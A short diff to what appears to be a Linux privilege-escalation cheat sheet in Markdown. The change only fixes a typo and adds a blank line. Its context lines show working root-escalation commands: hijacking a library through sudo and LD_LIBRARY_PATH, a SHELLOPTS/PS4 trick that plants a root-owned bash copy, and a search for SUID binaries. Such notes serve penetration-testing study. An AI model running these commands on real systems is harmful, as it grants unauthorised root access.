@@ -200,6 +200,7 @@ ldd /usr/sbin/apache2 # find shared libraries
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 sudo LD_LIBRARY_PATH=/tmp apache2
 ````
+
 ## SUID/SGID
 ### Find suid/sgid bins
 Exploit-DB, Google, and GitHub  
@@ -245,7 +246,7 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash &&
 ```
 
 ## Shared Object Injection
-First ouput all SUID binaries
+First output all SUID binaries
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
 ````
